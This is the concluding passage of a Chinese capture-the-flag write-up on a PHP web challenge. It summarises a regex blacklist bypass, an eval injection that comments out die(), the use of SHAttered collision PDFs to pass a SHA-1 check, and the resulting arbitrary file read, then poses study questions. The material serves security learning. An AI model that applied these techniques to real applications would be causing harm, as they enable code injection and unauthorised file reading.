- **空分支 + 裸 `?`**：一个让黑名单“全拦”，一个让正则“编译失败”，最后一错到底反而“全放”；
- **`eval` 拼接**：`$B = 1;` 已经给好了，用 `//` 注释掉 `echo $two;die();` 就行；
- **SHA-1 碰撞**：`(string)` 堵死数组，`===` 堵死魔法哈希，只能用 SHAttered 的真实样本；
- **multipart**：二进制要用 `files=` + `(None, value)`，否则要么进 `$_FILES`，要么撑爆 nginx；
- **任意文件读取**：三关都过之后，`file_get_contents` 想读什么读什么。

真正容易卡住的不是“会不会 PHP”，而是几个细节：**三关要一次请求过完**、**`//` 注释掉 `die()`**、**两个 PDF 要用 multipart 原始字节发**。把这三件事想清楚，剩下的就是体力活。

最后留三个问题，你可以自己想一想：

1. 如果第二关的正则删掉空分支、只留裸 `?`，你还能过吗？如果能，`comment` 怎么写？
2. 如果第三关把 `(string)` 去掉，保留 `sha1($a1) === sha1($a2)`，你能用数组绕过吗？为什么？
3. 如果 nginx 的 `client_max_body_size` 被调到 1MB 以下（比如 512KB），这题还能用 SHAttered 的两个完整 PDF 吗？你会怎么改？

下一步可以顺着两个方向走：一是 PHP 代码审计（类型混淆、`preg_match` 返回值、`eval`、文件操作），二是哈希安全（MD5/SHA-1 碰撞、长度扩展攻击、`hash_equals`）。把“输入到底被当成数据还是代码”这条线想清楚，很多 Web 题都是同一个味道。
